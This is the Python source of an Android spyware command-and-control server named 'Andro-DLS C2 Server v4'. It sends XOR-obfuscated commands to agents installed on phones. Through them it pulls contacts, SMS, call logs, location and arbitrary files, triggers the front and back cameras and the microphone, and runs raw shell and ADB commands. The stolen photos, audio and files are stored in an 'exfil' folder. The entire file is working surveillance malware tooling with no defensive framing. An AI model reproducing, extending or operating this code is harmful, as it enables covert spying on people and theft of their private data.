#!/usr/bin/env python3
"""Andro-DLS C2 Server v4 — Ring 0 Bridge. Dual execution: agent HTTP + ADB shell (UID 2000)."""

import http.server, urllib.parse, json, time, sys, base64, os, threading, subprocess

HOST, PORT = "0.0.0.0", 8080
LOG_FILE, CMD_FILE, XOR_KEY = "c2_log.json", "/tmp/c2_pending_cmd", b"DLS-2026"
pending_cmd, results_log, agents = "NONE", [], {}
lock = threading.Lock()

# ═══ XOR ═══
def xor_bytes(d,k): return bytes(d[i]^k[i%len(k)] for i in range(len(d)))
def xor_encode(p): return "XOR:"+base64.b64encode(xor_bytes(p.encode(),XOR_KEY)).decode()
def xor_decode(b): 
    if b.startswith("XOR:"): b=b[4:]
    return xor_bytes(base64.b64decode(b),XOR_KEY).decode("utf-8","replace")

def save_pending():
    with open(CMD_FILE,"w") as f: f.write(pending_cmd)
def load_pending():
    global pending_cmd
    try:
        with open(CMD_FILE) as f: pending_cmd = f.read().strip()
    except: pending_cmd = "NONE"

# ═══ RING 0 — ADB Shell ═══
def adb(cmd, timeout=30):
    try:
        r = subprocess.run(["adb","shell",cmd], capture_output=True, text=True, timeout=timeout)
        return r.stdout+(r.stderr if r.stderr else "")
    except subprocess.TimeoutExpired: return "[R0] TIMEOUT"
    except FileNotFoundError: return "[R0] ADB not found"
    except Exception as e: return f"[R0] {e}"

ADB_CMDS = {
    "sys:kernel":   lambda: adb("uname -a; getenforce; id"),
    "sys:proc":     lambda: adb("ps -A -o PID,USER,NAME 2>/dev/null | head -50"),
    "sys:net":      lambda: adb("cat /proc/net/tcp /proc/net/udp 2>/dev/null | head -30"),
    "sys:packages": lambda: adb("pm list packages 2>/dev/null | head -100"),
    "sys:dumpsys":  lambda: adb("dumpsys activity services 2>/dev/null | head -80"),
    "sys:props":    lambda: adb("getprop 2>/dev/null | head -80"),
    "sys:logs":     lambda: adb("logcat -d -t 100 2>/dev/null"),
    "sys:battery":  lambda: adb("dumpsys battery 2>/dev/null"),
    "sys:sensors":  lambda: adb("ls /sys/class/input/ /sys/class/thermal/ 2>/dev/null"),
    "sys:disk":     lambda: adb("df -h 2>/dev/null"),
    "sys:mem":      lambda: adb("cat /proc/meminfo 2>/dev/null | head -20"),
    "sys:cpu":      lambda: adb("cat /proc/cpuinfo 2>/dev/null | head -20"),
    "sys:selinux":  lambda: adb("getenforce; id -Z; ls -Z /data/data/com.androdls 2>/dev/null | head -5"),
    "sys:mounts":   lambda: adb("cat /proc/mounts 2>/dev/null | head -30"),
    "sys:wifi":     lambda: adb("dumpsys wifi 2>/dev/null | grep -E 'SSID|BSSID|IP' | head -20"),
    "sys:bugreport":lambda: adb("bugreportz 2>/dev/null", timeout=120),
    "sys:accounts": lambda: adb("dumpsys account 2>/dev/null | grep -E 'Account|name' | head -30"),
}
def is_r0(c): return c.lower().startswith(("sys:","elv:"))
def exec_r0(c):
    c = c.strip()
    if c in ADB_CMDS: return ADB_CMDS[c]()
    if c.startswith("elv:"): return adb(c[4:].strip())
    if c.startswith("sys:"): return adb(c[4:].strip())
    return "[R0] ?"

# ═══ File handlers ═══
def save_file(prefix, ext, data):
    try:
        _, b64 = data.split(":",1)
        d=os.path.join("exfil",prefix); os.makedirs(d,exist_ok=True)
        p=os.path.join(d,f"{prefix}_{int(time.time())}.{ext}")
        with open(p,"wb") as f: f.write(base64.b64decode(b64))
        print(f"[{prefix.upper()}] {p} ({os.path.getsize(p)} bytes)")
    except Exception as e: print(f"[{prefix.upper()}] Error: {e}")

# ═══ HTTP ═══
class H(http.server.BaseHTTPRequestHandler):
    def log_message(self,*a): pass
    def do_GET(self):
        if self.path=="/cmd":
            global pending_cmd
            load_pending()
            self.send_response(200); self.send_header("Content-Type","text/plain"); self.end_headers()
            cmd = pending_cmd; pending_cmd = "NONE"; save_pending()
            self.wfile.write(xor_encode(cmd).encode())
            if is_r0(cmd):
                print(f"\n[R0] EXEC: {cmd}")
                res = exec_r0(cmd)
                e = {"timestamp":time.time(),"path":"/ring0","data":res[:500]}
                with lock: results_log.append(e)
                with open(LOG_FILE,"a") as f: f.write(json.dumps(e)+"\n")
                print(f"[R0] Done ({len(res)} chars): {res[:200]}")
            return
        self.send_response(404); self.end_headers()
    def do_POST(self):
        l = int(self.headers.get("Content-Length",0))
        d = self.rfile.read(l).decode()
        parsed = urllib.parse.parse_qs(d)
        raw = parsed.get("data",[""])[0]
        data = xor_decode(raw) if raw.startswith("XOR:") else raw
        ts = time.strftime("%H:%M:%S")
        e = {"timestamp":time.time(),"path":self.path,"data":data[:500]}
        with lock:
            results_log.append(e)
            if self.path=="/register" and "ID=" in data:
                for line in data.split("\n"):
                    if "=" in line:
                        k,v=line.split("=",1)
                        if k=="ID": agents[v[:16]]=e
            with open(LOG_FILE,"a") as f: f.write(json.dumps(e)+"\n")
        if data.startswith("FILE:"): save_file("files","bin",data[5:])
        elif data.startswith("PHOTO:"): save_file("photos","jpg",data[6:])
        elif data.startswith("AUDIO:"): save_file("audio","3gp",data[6:])
        print(f"\n[+] {ts} ← {self.path}: {data[:150]}")
        self.send_response(200); self.end_headers(); self.wfile.write(b"OK")

# ═══ Menu ═══
def menu():
    print("""
╔════════════════════════════════════════╗
║     Andro-DLS C2 Server v4 RING 0     ║
╠════════════════════════════════════════╣
║  AGENT (app-level):                   ║
║  s | ct | sm | cl | loc | info        ║
║  cam-f | cam-b | mic N | get PATH     ║
╠════════════════════════════════════════╣
║  RING 0 (adb shell, UID 2000):        ║
║  sys:kernel  sys:proc    sys:net      ║
║  sys:packages sys:dumpsys sys:props   ║
║  sys:logs    sys:battery sys:sensors  ║
║  sys:disk    sys:mem     sys:cpu      ║
║  sys:selinux sys:mounts  sys:wifi     ║
║  sys:accounts sys:bugreport           ║
║  elv:<cmd>  (raw ADB shell)           ║
╠════════════════════════════════════════╣
║  r | a | q                            ║
╚════════════════════════════════════════╝
""")

def loop():
    global pending_cmd
    while True:
        try:
            c = input("C2> ").strip()
            if not c: continue
            if c=="q": os._exit(0)
            elif c=="r":
                with lock:
                    for r in results_log[-10:]:
                        print(f"  {time.strftime('%H:%M:%S',time.localtime(r['timestamp']))} | {r['data'][:200]}")
            elif c=="a": print(json.dumps(list(agents.keys()),indent=2))
            elif is_r0(c):
                print(f"[R0] Executing…")
                res = exec_r0(c)
                e = {"timestamp":time.time(),"path":"/ring0","data":res[:500]}
                with lock: results_log.append(e)
                with open(LOG_FILE,"a") as f: f.write(json.dumps(e)+"\n")
                print(res[:1000])
            elif c=="s":
                sh=input("shell> "); pending_cmd="sh:"+sh; save_pending()
                print(f"[*] Queued: {sh}")
            elif c=="ct": pending_cmd="dump:contacts"; save_pending(); print("[*] Contacts queued")
            elif c=="sm": pending_cmd="dump:sms"; save_pending(); print("[*] SMS queued")
            elif c=="cl": pending_cmd="dump:calllog"; save_pending(); print("[*] Call log queued")
            elif c=="loc": pending_cmd="dump:location"; save_pending(); print("[*] Location queued")
            elif c=="info": pending_cmd="dump:device"; save_pending(); print("[*] Device info queued")
            elif c=="cam-f": pending_cmd="cam:front"; save_pending(); print("[*] Front cam queued")
            elif c=="cam-b": pending_cmd="cam:back"; save_pending(); print("[*] Back cam queued")
            elif c.startswith("mic "): pending_cmd=f"mic:{c[4:].strip()}"; save_pending(); print(f"[*] Audio queued")
            elif c.startswith("get "): pending_cmd=f"get:{c[4:].strip()}"; save_pending(); print(f"[*] File queued")
            else: pending_cmd="sh:"+c; save_pending(); print(f"[*] Queued: {c}")
        except (EOFError,KeyboardInterrupt): print("\n[*] Exit"); os._exit(0)

if __name__=="__main__":
    if "--port" in sys.argv: PORT=int(sys.argv[sys.argv.index("--port")+1])
    menu()
    dev = adb("id 2>/dev/null").strip() and "YES" or "NO"
    print(f"[*] {HOST}:{PORT} | XOR:ON | Ring0:{dev}")
    load_pending()
    threading.Thread(target=loop,daemon=True).start()
    try: http.server.HTTPServer((HOST,PORT),H).serve_forever()
    except KeyboardInterrupt: print("\n[*] Done.")